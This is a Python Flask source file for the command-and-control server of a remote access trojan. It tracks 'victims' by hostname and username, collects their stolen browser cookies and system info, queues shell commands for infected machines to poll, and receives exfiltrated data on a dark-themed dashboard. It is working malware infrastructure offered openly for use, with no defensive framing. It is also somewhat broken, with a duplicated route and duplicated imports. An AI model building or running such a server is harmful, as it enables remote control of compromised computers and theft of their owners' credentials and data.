from flask import Flask, request, jsonify, render_template
import sqlite3
import json
from datetime import datetime
import os

app = Flask(__name__)
DB_PATH = 'c2.db'

# Initialize DB
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS victims (
        id TEXT PRIMARY KEY,
        hostname TEXT,
        username TEXT,
        first_seen TEXT,
        last_seen TEXT,
        cookies TEXT,
        sysinfo TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS commands (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        victim_id TEXT,
        command TEXT,
        sent INTEGER DEFAULT 0,
        created_at TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS exfil (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        victim_id TEXT,
        type TEXT,
        content TEXT,
        received_at TEXT
    )''')
    conn.commit()
    conn.close()

init_db()

# Helper: DB connection
def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

# === RAT ENDPOINTS ===

@app.route('/checkin', methods=['POST'])
def checkin():
    data = request.json
    victim_id = data.get('victim_id', 'unknown')
    hostname = data.get('hostname', 'unknown')
    username = data.get('username', 'unknown')
    cookies = data.get('cookies', '')
    sysinfo = data.get('sysinfo', '')
    now = datetime.utcnow().isoformat()
    
    conn = get_db()
    c = conn.cursor()
    c.execute('''INSERT OR REPLACE INTO victims 
                 (id, hostname, username, first_seen, last_seen, cookies, sysinfo)
                 VALUES (?, ?, ?, 
                         COALESCE((SELECT first_seen FROM victims WHERE id=?), ?),
                         ?, ?, ?)''',
              (victim_id, hostname, username, victim_id, now, now, cookies, sysinfo))
    conn.commit()
    conn.close()
    return jsonify({'status': 'ok'})

@app.route('/poll', methods=['POST'])
def poll():
    data = request.json
    victim_id = data.get('victim_id', 'unknown')
    
    conn = get_db()
    c = conn.cursor()
    # Get next unsent command
    c.execute('SELECT id, command FROM commands WHERE victim_id=? AND sent=0 ORDER BY created_at ASC LIMIT 1', (victim_id,))
    row = c.fetchone()
    
    if row:
        cmd_id, cmd = row
        c.execute('UPDATE commands SET sent=1 WHERE id=?', (cmd_id,))
        conn.commit()
        conn.close()
        return jsonify({'command': cmd})
    
    conn.close()
    return jsonify({'command': ''})

@app.route('/exfil', methods=['POST'])
def exfil():
    data = request.json
    victim_id = data.get('victim_id', 'unknown')
    content = data.get('content', '')
    data_type = data.get('type', 'generic')
    now = datetime.utcnow().isoformat()
    
    conn = get_db()
    c = conn.cursor()
    c.execute('INSERT INTO exfil (victim_id, type, content, received_at) VALUES (?, ?, ?, ?)',
              (victim_id, data_type, content, now))
    conn.commit()
    conn.close()
    return jsonify({'status': 'ok'})

# === WEB DASHBOARD ===

@app.route('/') # or /dashboard
def dashboard():
    conn = get_db()
    c = conn.cursor()
    c.execute('SELECT * FROM victims ORDER BY last_seen DESC')
    victims = [dict(row) for row in c.fetchall()]
    conn.close()
    return render_template('dashboard.html', victims=victims)

@app.route('/victim/<victim_id>')
def victim_detail(victim_id):
    conn = get_db()
    c = conn.cursor()
    c.execute('SELECT * FROM victims WHERE id=?', (victim_id,))
    victim = c.fetchone()
    
    # Commands sent to this victim
    c.execute('SELECT * FROM commands WHERE victim_id=? ORDER BY created_at DESC LIMIT 50', (victim_id,))
    commands = [dict(row) for row in c.fetchall()]
    
    # Exfiltrated data
    c.execute('SELECT * FROM exfil WHERE victim_id=? ORDER BY received_at DESC LIMIT 50', (victim_id,))
    exfils = [dict(row) for row in c.fetchall()]
    
    conn.close()
    return render_template('victim.html', victim=dict(victim) if victim else None, 
                          commands=commands, exfils=exfils, victim_id=victim_id)

@app.route('/send_command', methods=['POST'])
def send_command():
    victim_id = request.form.get('victim_id')
    command = request.form.get('command')
    
    if not victim_id or not command:
        return jsonify({'error': 'Missing fields'}), 400
    
    conn = get_db()
    c = conn.cursor()
    c.execute('INSERT INTO commands (victim_id, command, created_at) VALUES (?, ?, ?)',
              (victim_id, command, datetime.utcnow().isoformat()))
    conn.commit()
    conn.close()
    return jsonify({'status': 'queued'})

# === TEMPLATES ===

from flask import Flask, render_template_string

# Inline templates for simplicity (you'd normally use separate .html files)
DASHBOARD_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>ENI C2 Dashboard</title>
    <style>
        body { font-family: monospace; background: #1a1a1a; color: #0f0; padding: 20px; }
        .victim { border: 1px solid #333; margin: 10px 0; padding: 10px; }
        .victim a { color: #0ff; }
        .last { color: #888; font-size: 0.9em; }
    </style>
</head>
<body>
    <h1>🖥️ Victims ({{ victims|length }})</h1>
    {% for v in victims %}
    <div class="victim">
        <strong>{{ v.hostname }} / {{ v.username }}</strong> 
        <a href="/victim/{{ v.id }}">[details]</a><br>
        <span class="last">Last seen: {{ v.last_seen }}</span><br>
        ID: <code>{{ v.id }}</code>
    </div>
    {% endfor %}
</body>
</html>
'''

VICTIM_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>Victim: {{ victim.hostname }}</title>
    <style>
        body { font-family: monospace; background: #1a1a1a; color: #0f0; padding: 20px; }
        .section { margin: 20px 0; border: 1px solid #333; padding: 10px; }
        pre { background: #000; padding: 10px; overflow-x: auto; }
        input, button { background: #333; color: #0f0; border: 1px solid #555; padding: 5px; }
    </style>
</head>
<body>
    <h1>{{ victim.hostname }} ({{ victim.username }})</h1>
    <p>ID: <code>{{ victim_id }}</code></p>
    
    <div class="section">
        <h3>📤 Send Command</h3>
        <form method="POST" action="/send_command">
            <input type="hidden" name="victim_id" value="{{ victim_id }}">
            <input type="text" name="command" placeholder="cmd:whoami" style="width: 300px;">
            <button type="submit">Send</button>
        </form>
    </div>
    
    <div class="section">
        <h3>📥 Recent Commands</h3>
        {% for cmd in commands %}
        <div>{{ cmd.created_at }}: <code>{{ cmd.command }}</code> (sent: {{ cmd.sent }})</div>
        {% endfor %}
    </div>
    
    <div class="section">
        <h3>📤 Exfiltrated Data</h3>
        {% for ex in exfils %}
        <div>{{ ex.received_at }} - {{ ex.type }}</div>
        <pre>{{ ex.content[:500] }}{% if ex.content|length > 500 %}...{% endif %}</pre>
        {% endfor %}
    </div>
    
    <div class="section">
        <h3>ℹ️ System Info</h3>
        <pre>{{ victim.sysinfo if victim.sysinfo else 'No sysinfo yet' }}</pre>
    </div>
    
    <div class="section">
        <h3>🍪 Cookies</h3>
        <pre>{{ victim.cookies if victim.cookies else 'No cookies yet' }}</pre>
    </div>
</body>
</html>
'''

@app.route('/dashboard')
def dashboard_alt():
    conn = get_db()
    c = conn.cursor()
    c.execute('SELECT * FROM victims ORDER BY last_seen DESC')
    victims = [dict(row) for row in c.fetchall()]
    conn.close()
    return render_template_string(DASHBOARD_TEMPLATE, victims=victims)

@app.route('/victim/<victim_id>')
def victim_detail_alt(victim_id):
    conn = get_db()
    c = conn.cursor()
    c.execute('SELECT * FROM victims WHERE id=?', (victim_id,))
    victim = c.fetchone()
    c.execute('SELECT * FROM commands WHERE victim_id=? ORDER BY created_at DESC LIMIT 50', (victim_id,))
    commands = [dict(row) for row in c.fetchall()]
    c.execute('SELECT * FROM exfil WHERE victim_id=? ORDER BY received_at DESC LIMIT 50', (victim_id,))
    exfils = [dict(row) for row in c.fetchall()]
    conn.close()
    return render_template_string(VICTIM_TEMPLATE, 
                                 victim=dict(victim) if victim else None,
                                 commands=commands, exfils=exfils, victim_id=victim_id)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))